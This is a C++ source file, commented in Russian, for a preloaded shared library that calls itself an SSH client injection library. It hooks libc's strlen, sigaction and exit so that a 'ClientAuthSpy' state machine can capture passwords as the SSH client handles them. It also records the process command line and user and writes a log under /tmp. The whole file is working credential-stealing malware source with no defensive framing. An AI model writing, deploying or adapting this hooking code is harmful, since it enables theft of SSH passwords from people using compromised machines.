/**
 * SSH Client Injection Library
 * Intercepts strlen, sigaction, exit to capture passwords via state machine.
 */

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <exception>
#include "state.hpp"

// Указатели на реальные функции
static size_t (*real_strlen)(const char*) = NULL;
static int (*real_sigaction)(int, const struct sigaction*, struct sigaction*) = NULL;
static void (*real_exit)(int) = NULL;

static ClientAuthSpy* spy = NULL;

// Функция для получения cmdline
const char* get_cmdline_static() {
    static char cmd_buf[2048] = {0};
    if (cmd_buf[0] == '\0') {
        FILE* f = fopen("/proc/self/cmdline", "r");
        if (f) {
            size_t n = fread(cmd_buf, 1, sizeof(cmd_buf) - 1, f);
            if (n > 0) {
                for(size_t i = 0; i < n; ++i) {
                    if(cmd_buf[i] == '\0' && i < n - 1) {
                        cmd_buf[i] = ' ';
                    }
                }
                cmd_buf[n] = '\0';
            } else {
                 strcpy(cmd_buf, "unknown (read 0)");
            }
            fclose(f);
        } else {
            strcpy(cmd_buf, "unknown (fopen failed)");
        }
    }
    return cmd_buf;
}

// Функция для получения user
const char* get_user_static() {
    static char user_buf[256] = {0};
    if (user_buf[0] == '\0') {
        if (getlogin_r(user_buf, sizeof(user_buf)) != 0) {
            const char* user_env = getenv("USER");
            if (user_env) {
                 strncpy(user_buf, user_env, sizeof(user_buf) - 1);
                 user_buf[sizeof(user_buf) - 1] = '\0';
            } else {
                 strcpy(user_buf, "unknown");
            }
        }
    }
    return user_buf;
}

// Инициализация SPY
void initialize_spy() {
    if (spy) return;

    ProcessInfo pi;
    pi.cmdline = get_cmdline_static();
    pi.user = get_user_static();

    try {
        spy = new ClientAuthSpy(pi);
    } catch (...) {
        fprintf(stderr, "Failed to initialize ClientAuthSpy\n");
        abort();
    }
    
    spy->Initiated();

    FILE* log_file = fopen("/tmp/ssh_inj.dbg", "a");
    if (log_file) {
        fprintf(log_file, "[ + ] Injection started\n");
        fclose(log_file);
    }
}

extern "C" {

// --- Перехват strlen ---
size_t strlen(const char *s) {
    // Загрузка real_strlen
    if (!real_strlen) {
        void* handle = dlopen("libc.so.6", RTLD_LAZY);
        if (!handle) { abort(); }
        real_strlen = (size_t(*)(const char*))dlsym(handle, "strlen");
        if (!real_strlen) { abort(); }

        // Инициализируем SPY
        initialize_spy();
    }

    // Вызов обработчика в spy
    spy->StrlenCalled(s);

    // Вызов реальной функции
    return real_strlen(s);
}

// --- Перехват sigaction ---
int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact) {
    // Загрузка real_sigaction
    if (!real_sigaction) {
        void* handle = dlopen("libc.so.6", RTLD_LAZY);
        if (!handle) { abort(); }
        real_sigaction = (int(*)(int, const struct sigaction*, struct sigaction*))dlsym(handle, "sigaction");
        if (!real_sigaction) { abort(); }

        // Инициализируем SPY, если не был
        if (!spy) { initialize_spy(); }
    }

    // Логика для SIGTTOU
    if (signum == SIGTTOU) {
        if (spy) {
            spy->SigactionSIGTOUCalled();
        }
    }

    // Вызов реальной функции
    return real_sigaction(signum, act, oldact);
}

// --- Перехват exit ---
void exit(int status) {
    // Загрузка real_exit
    if (!real_exit) {
        void* handle = dlopen("libc.so.6", RTLD_LAZY);
        if (!handle) { _exit(status); }
        real_exit = (void(*)(int))dlsym(handle, "exit");
        if (!real_exit) { _exit(status); }

        // Инициализируем SPY, если нужно
        if (!spy) { initialize_spy(); }
    }

    // Вызов обработчика в spy
    if (spy) {
        spy->E_xitCalled();
        delete spy;
        spy = NULL;
    }

    // Вызов реальной функции exit
    real_exit(status);
    __builtin_unreachable();
}

} // extern "C" 